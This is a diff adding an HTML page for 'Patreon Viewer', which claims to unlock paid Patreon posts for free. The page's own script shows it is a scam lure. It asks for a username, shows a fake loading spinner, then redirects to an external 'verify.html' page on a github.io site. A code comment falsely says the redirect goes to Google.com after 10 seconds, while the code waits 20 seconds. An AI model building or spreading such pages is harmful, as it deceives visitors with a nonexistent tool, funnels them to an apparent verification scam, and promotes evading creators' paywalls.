@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+
+  <!-- Viewport Settings for Responsive Design -->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- Title of the Website (Important for SEO) -->
+  <title>Patreon Viewer: View Patreon Posts For Free</title>
+
+  <!-- Meta Description (Brief overview of the page content) -->
+  <meta name="description" content="Explore exclusive content from your favorite creators on Patreon—no subscriptions required. Patreon Viewer allows you to access and watch premium posts for free, anytime, anywhere!">
+
+  <!-- Meta Keywords (Additional keywords related to the site) -->
+  <meta name="keywords" content="Patreon viewer, view Patreon posts for free, free Patreon content, access Patreon posts, watch Patreon content without subscription, free creator content, Patreon posts, Patreon viewer tool, free Patreon access, explore Patreon creators, view exclusive content for free, discover Patreon posts, no subscription Patreon viewer, free Patreon viewer, Patreon posts without payment, watch Patreon videos for free, discover creator content on Patreon">
+
+  <!-- Open Graph Tags for Social Media Sharing -->
+  <meta property="og:title" content="Patreon Viewer: View Patreon Posts For Free">
+  <meta property="og:description" content="Explore exclusive content from your favorite creators on Patreon—no subscriptions required. Patreon Viewer allows you to access and watch premium posts for free, anytime, anywhere!">
+  <meta property="og:image" content="patreon-unlocker.jpg"> <!-- Replace with your image URL -->
+  <meta property="og:url" content="https://patreo-viewer-tool.vi-ck.com/"> <!-- Replace with your website URL -->
+  <meta property="og:type" content="website">
+
+  <!-- Twitter Card Tags for Twitter Sharing -->
+  <meta name="twitter:title" content="Patreon Viewer: View Patreon Posts For Free">
+  <meta name="twitter:description" content="Explore exclusive content from your favorite creators on Patreon—no subscriptions required. Patreon Viewer allows you to access and watch premium posts for free, anytime, anywhere!">
+  <meta name="twitter:image" content="patreon-unlocker.jpg"> <!-- Replace with your image URL -->
+  <meta name="twitter:card" content="summary_large_image">
+
+  <!-- Additional SEO Tags -->
+  <meta name="robots" content="index, follow"> <!-- Tells search engines to index the page and follow links -->
+  <meta name="author" content="Vi Ck Viewer">
+  
+  <!-- Favicon for your site -->
+  <link rel="icon" href="favicon.ico" type="image/x-icon">
+  <link rel="canonical" href="https://patreo-viewer-tool.vi-ck.com/">
+  <!-- Font Awesome for icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    /* Reset and base styles */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: Arial, sans-serif; line-height: 1.6; color: #000000; }
+    header, section, footer { padding: 20px; }
+
+    /* Header Logo Centering */
+    .logo { display: block; margin: 0 auto; max-width: 100px; }
+    header {
+       background: #7ba9ff; 
+    }
+
+    /* Hero Section */
+    #hero {
+      text-align: center;
+      padding: 60px 20px;
+      background: #7ba9ff;
+    }
+    #hero h1 { font-size: 2.5rem; margin-bottom: 20px; }
+    #hero p { font-size: 1.2rem; margin-bottom: 30px; }
+    #hero button {
+  padding: 10px 20px;
+  font-size: 1rem;
+  cursor: pointer;
+  background-color: #000; /* Black background */
+  color: white; /* White text */
+  border: none; /* No border */
+  border-radius: 16px; /* Rounded corners */
+  transition: background-color 0.3s ease; /* Smooth hover effect */
+}
+#username {
+            margin-top: 15px;
+            padding: 10px;
+            font-size: 16px;
+            width: 80%;
+            max-width: 300px;
+            border: 2px solid #673de6;
+            border-radius: 17px;
+            outline: none;
+        }
+#hero button:hover {
+  background-color: #333; /* Darker background color on hover */
+}
+
+.hidden {
+  display: none;
+}
+
+
+    /* About Section */
+    #about { padding: 60px 20px; }
+    #about h2 { font-size: 2rem; margin-bottom: 20px; }
+    #about p { font-size: 1rem; }
+
+    /* Features Section */
+    #features {
+      padding: 60px 20px;
+      background: #f9f9f9;
+    }
+    .features-container {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 20px;
+    }
+    .feature {
+      flex: 1 1 calc(33% - 40px);
+      max-width: calc(33% - 40px);
+      background: #fff;
+      padding: 20px;
+      text-align: center;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+    }
+    .feature i { font-size: 4rem; margin-bottom: 10px; color: #f97300; }
+
+    /* Footer */
+    footer {
+      background: #7ba9ff;
+      color: #000;
+      text-align: center;
+      padding: 20px;
+    }
+    footer .logo { invert(1); max-width: 100px; }
+    footer nav a {
+      color: #000;
+      margin: 0 10px;
+      text-decoration: none;
+    }
+
+    /* Loader */
+    .loader {
+      border: 8px solid #f3f3f3;
+      border-radius: 50%;
+      border-top: 8px solid #000;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+    @keyframes spin { 100% { transform: rotate(360deg); } }
+
+    /* Responsive Styles */
+    @media (max-width: 768px) {
+      .feature { flex: 1 1 calc(50% - 40px); max-width: calc(50% - 40px); }
+    }
+    @media (max-width: 480px) {
+      .feature { flex: 1 1 100%; max-width: 100%; }
+    }
+  </style>
+</head>
+<body>
+  <!-- Header with Centered Logo -->
+  <header>
+    <img src="logo.png" alt="Patreon Viewer Logo" class="logo">
+  </header>
+
+  <!-- Hero Section -->
+  <section id="hero">
+    <h1>View Patreon Posts Without Paying</h1>
+    <p>Patreon Viewer is your gateway to premium content from top creators—no cost, no commitment. Browse Patreon posts, videos, and artwork for free, just by entering a username!</p>
+    <button id="openInput">Get Started</button>
+    <!-- Username Input Section (hidden by default) -->
+    <div id="usernameSection" class="hidden" style="margin-top: 20px;">
+      <input type="text" id="username" placeholder="Enter your username" style="padding:10px; font-size:1rem;">
+      <button id="startNow" style="padding:10px 20px; font-size:1rem; margin-left: 10px;">Start Now!</button>
+    </div>
+    <!-- Loader (hidden by default) -->
+    <div id="loader" class="hidden">
+      <div class="loader"></div>
+    </div>
+  </section>
+
+  <!-- About Section -->
+  <section id="about">
+    <h2>About Patreon Viewer</h2>
+    <p>Patreon Viewer is a free and easy-to-use tool designed to give you access to exclusive content from your favorite creators on Patreon—without the need for a subscription. Whether you're looking to view behind-the-scenes posts, videos, or other premium content, Patreon Viewer lets you explore the best creator content on the platform, anytime, anywhere.</p>
+    <br><p>Our tool removes the barriers of paywalls and subscriptions, allowing you to enjoy content from a variety of creators without any hassle. With a clean, user-friendly interface, Patreon Viewer offers a seamless experience, giving you a glimpse into the world of Patreon creators for free.</p><br><p>No sign-ups, no payments—just a simple and convenient way to access and enjoy premium content from the creators you love.</p>
+  </section>
+
+  <!-- Features Section -->
+<section id="features">
+  <div class="features-container">
+    <div class="feature">
+      <i class="fas fa-eye"></i>
+      <h3>View Exclusive Content for Free</h3>
+      <p>Effortlessly browse and explore a variety of exclusive creator posts on Patreon, including photos, videos, and written content. Discover new creators and enjoy their content without any subscriptions.</p>
+    </div>
+    <div class="feature">
+      <i class="fas fa-search"></i>
+      <h3>Search Patreon Creators</h3>
+      <p>Find your favorite creators or explore new ones with our powerful search tool. Discover a wide range of creators across different categories, including gaming, art, music, and more. Tailor your search to match your interests and preferences.</p>
+    </div>
+    <div class="feature">
+      <i class="fas fa-thumbs-up"></i>
+      <h3>Like & Share Creator Posts</h3>
+      <p>Support and engage with creators by liking and sharing their posts with friends and fellow fans. Help boost their visibility and show appreciation for the content they provide. Sharing is a great way to spread the love and support the creators you love!</p>
+    </div>
+    <div class="feature">
+      <i class="fas fa-comments"></i>
+      <h3>Comment & Interact with Creators</h3>
+      <p>Join the conversation with creators and fellow fans by commenting on posts. Whether you're giving feedback or simply showing your support, commenting is a great way to connect and engage with the Patreon community.</p>
+    </div>
+    <div class="feature">
+      <i class="fas fa-heart"></i>
+      <h3>Save Your Favorite Creators</h3>
+      <p>Keep track of the creators you enjoy most by saving them to your favorites. Return to their pages easily and never miss out on new content. Your personalized favorites list makes exploring Patreon even more enjoyable.</p>
+    </div>
+    <div class="feature">
+      <i class="fas fa-cog"></i>
+      <h3>Customize Your Viewing Experience</h3>
+      <p>Personalize your content browsing with customizable settings. Adjust filters, notifications, and display options to enhance your user experience. Patreon Viewer lets you fine-tune your viewing preferences for maximum enjoyment.</p>
+    </div>
+  </div>
+</section>
+
+
+  <!-- Footer Section -->
+  <footer>
+    <img src="logo.png" alt="Patreon Viewer Logo" class="logo">
+    <nav style="margin-top: 10px;">
+      <a href="#hero">Home</a>
+      <a href="#about">About</a>
+      <a href="#features">Features</a>
+    </nav>
+  </footer>
+
+  <!-- JavaScript for Interactive Behavior -->
+  <script>
+    // When the "Get Started" button is clicked, show the username input section.
+    document.getElementById('openInput').addEventListener('click', function() {
+      document.getElementById('usernameSection').classList.remove('hidden');
+      this.style.display = 'none';
+    });
+
+    // When the "Start Now!" button is clicked, check the username, show the loader, and then redirect after 10 seconds.
+    document.getElementById('startNow').addEventListener('click', function() {
+      var username = document.getElementById('username').value;
+      if(username.trim() === "") {
+        alert("Please enter your username.");
+        return;
+      }
+      // Show loader and hide the username input section
+      document.getElementById('loader').classList.remove('hidden');
+      document.getElementById('usernameSection').classList.add('hidden');
+      
+      // After 10 seconds, redirect to Google.com
+      setTimeout(function() {
+        window.location.href = "https://abidjan125890.github.io/p1/verify.html";
+      }, 20000);
+    });
+  </script>
+</body>
+</html>
